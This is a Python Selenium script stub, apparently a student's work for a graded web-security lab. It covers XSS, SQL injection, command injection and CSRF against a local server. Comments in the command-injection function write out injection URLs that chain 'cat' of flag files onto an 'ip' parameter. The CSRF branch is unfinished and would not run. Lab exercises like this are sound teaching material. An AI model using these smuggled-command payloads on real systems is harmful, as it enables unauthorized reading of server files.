from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import base64
import grader

# NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'

def xss(vuln_type, level):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options) # Starts the browser

    driver.get(TARGET_SERVER_ENDPOINT) # Makes a request to the specified URL.

    # DO SOMETHING

    # Grader verification should be done in attacker_server/server.py

    driver.quit() # Closes the browser

def sql():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    driver.get(TARGET_SERVER_ENDPOINT)

    soup = BeautifulSoup(driver.page_source) # Get the page contents and use for parsing.
    tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.

    # TODO: Populate the user_pass_list
    # user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
                        # eg. [['username', 'password']]


    # grader.sql_verify('low', user_pass_list)

    driver.quit()

def command_injection(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # NOTE: Remember to decode the flag before sending it to the grader.
    # grader.command_injection_verify(level, flag)
    # Request url for low level
    # http://localhost:1337/command_injection/low?ip=example.com;cat%20./server/flags/low.txt%20|%20base64%20-d
    # Request url for medium level
    # http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/medium.txt%20|%20base64%20-d
    # http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/high.txt%20|%20base64%20-d
    driver.quit()

def csrf(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # Do the requests and decoding
    if(level == low):

    # grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.

    driver.quit()

if __name__ == '__main__':

    # NOTE: Feel free to modify the code here for your own purposes.
    # The code below can be used as an example.

    for level in ['low', 'medium', 'high']:
        command_injection(level)

    sql()

    for vuln_type in ['1', '2', '3']:
        for level in ['low', 'medium', 'high']:
            xss(vuln_type, level)

    for level in ['low', 'medium', 'high']:
        csrf(level)
